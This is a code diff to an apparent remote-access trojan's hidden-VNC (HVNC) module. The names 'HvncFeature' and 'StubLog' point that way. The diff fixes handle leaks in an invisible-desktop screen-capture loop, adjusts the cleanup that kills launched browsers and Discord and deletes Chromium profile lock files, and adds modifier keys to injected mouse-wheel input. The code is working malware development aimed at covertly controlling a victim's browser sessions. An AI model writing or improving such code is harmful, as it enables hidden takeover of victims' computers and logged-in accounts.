@@ -414,8 +414,12 @@ internal static class HvncFeature
         {
             // PrintWindow hung for >5 s — leak GDI handles rather than calling
             // CloseDesktop/GdiplusShutdown under a live thread (UB / crash risk).
-            // Zero out the fields so Start() allocates fresh resources next session.
-            _hDesktop = 0; _gdipToken = 0; _h264Enc = null; _compHdcRef = 0;
+            // Zero ALL composite + desktop fields so Start() allocates fresh resources
+            // and EnsureComposite() does not reuse stale handles before the orphan
+            // thread's own cleanup code runs.
+            _hDesktop = 0; _gdipToken = 0; _h264Enc = null;
+            _compHdcRef = 0; _compHdc = 0; _compHbm = 0; _compBits = 0;
+            _compW = 0; _compH = 0;
         }
 
         _movingWindow    = false;
@@ -451,8 +455,12 @@ internal static class HvncFeature
         _launchedPids.Clear();
         if (launchedDiscord) KillProcessByName("discord.exe");
 
-        // Small pause so the OS flushes file handles before we try to delete lock files.
-        Thread.Sleep(300);
+        // Only pause when processes were actually killed — the OS needs time to flush
+        // file handles before CleanChromiumHvncLocks() tries to delete lock files.
+        bool anyLaunched = launchedOpera || launchedOperaGX || launchedEdge || launchedChrome ||
+            launchedBrave || launchedVivaldi || launchedChromium || launchedFirefox || launchedDiscord;
+        if (anyLaunched)
+            Thread.Sleep(300);
 
         // Clean up Chromium singleton lock files + repair any corrupted JSON in HVNC profiles.
         CleanChromiumHvncLocks();
@@ -641,9 +649,15 @@ internal static class HvncFeature
         catch { }
 
         StubLog.Info("[HVNC] CaptureLoop stopped");
-        FreeWinCache();
-        FreeComposite();
-        if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
+        // Only free GDI resources when this is still the current session.
+        // An orphan thread (mySession < _sessionId) must not touch resources
+        // already allocated by the next session's Start() call.
+        if (_sessionId == mySession)
+        {
+            FreeWinCache();
+            FreeComposite();
+            if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
+        }
     }
 
     // ── Frame capture DIBSection cache + direct pixel copy ──
@@ -1248,7 +1262,10 @@ internal static class HvncFeature
         nint hwnd = SmartWindowFromPoint(new POINT { x = _curX, y = _curY });
         if (hwnd == 0) hwnd = _lastHwnd;
         if (hwnd == 0) return;
-        nint wp = (nint)(((uint)(short)delta << 16) & 0xFFFF0000);
+        // Include modifier keys: MK_CONTROL (0x0008) enables Ctrl+scroll (browser zoom),
+        // MK_SHIFT (0x0004) enables horizontal scroll in apps that support it.
+        uint mkeys = (_ctrlDown ? 0x0008u : 0u) | (_shiftDown ? 0x0004u : 0u);
+        nint wp = (nint)(((uint)(short)delta << 16) | mkeys);
         PostMessage(hwnd, WM_MOUSEWHEEL, wp, MakeLParam(_curX, _curY));
     }
 
